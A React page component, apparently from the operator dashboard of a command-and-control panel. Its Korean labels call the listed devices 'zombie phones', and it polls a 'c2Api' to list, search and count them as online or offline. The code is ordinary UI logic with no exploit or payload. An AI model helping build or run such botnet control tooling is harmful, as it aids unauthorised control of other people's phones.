import React, { useEffect, useState } from 'react';
import { Search, Filter } from 'lucide-react';
import NodeCard from '../components/NodeCard';
import { c2Api } from '../api/c2Api';

export default function NodesPage() {
  const [nodes, setNodes] = useState([]);
  const [filteredNodes, setFilteredNodes] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    loadNodes();
    const interval = setInterval(loadNodes, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    filterNodes();
  }, [nodes, searchTerm, statusFilter]);

  const loadNodes = async () => {
    try {
      const data = await c2Api.getNodes();
      setNodes(data);
    } catch (error) {
      console.error('Failed to load nodes:', error);
    } finally {
      setLoading(false);
    }
  };

  const filterNodes = () => {
    let filtered = nodes;

    if (statusFilter !== 'all') {
      filtered = filtered.filter(node => node.status === statusFilter);
    }

    if (searchTerm) {
      filtered = filtered.filter(node =>
        node.device_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        node.model?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        node.node_id?.includes(searchTerm)
      );
    }

    setFilteredNodes(filtered);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary"></div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h2 className="text-3xl font-bold mb-2">좀비폰 관리</h2>
        <p className="text-gray-500">등록된 모든 좀비폰을 관리하고 모니터링하세요</p>
      </div>

      {/* Filters */}
      <div className="card p-4">
        <div className="flex flex-col md:flex-row gap-4">
          {/* Search */}
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500" size={20} />
            <input
              type="text"
              placeholder="디바이스명, 모델, Node ID로 검색..."
              className="input w-full pl-10"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>

          {/* Status Filter */}
          <div className="flex items-center gap-2">
            <Filter size={20} className="text-gray-500" />
            <select
              className="input"
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
            >
              <option value="all">전체 상태</option>
              <option value="online">온라인</option>
              <option value="offline">오프라인</option>
            </select>
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="card p-4">
          <div className="text-sm text-gray-500 mb-1">전체 노드</div>
          <div className="text-2xl font-bold">{nodes.length}</div>
        </div>
        <div className="card p-4">
          <div className="text-sm text-gray-500 mb-1">온라인</div>
          <div className="text-2xl font-bold text-green-400">
            {nodes.filter(n => n.status === 'online').length}
          </div>
        </div>
        <div className="card p-4">
          <div className="text-sm text-gray-500 mb-1">오프라인</div>
          <div className="text-2xl font-bold text-gray-500">
            {nodes.filter(n => n.status === 'offline').length}
          </div>
        </div>
      </div>

      {/* Nodes Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {filteredNodes.map((node) => (
          <NodeCard key={node.node_id} node={node} />
        ))}
      </div>

      {filteredNodes.length === 0 && (
        <div className="card p-12 text-center text-gray-500">
          <p>검색 결과가 없습니다</p>
        </div>
      )}
    </div>
  );
}
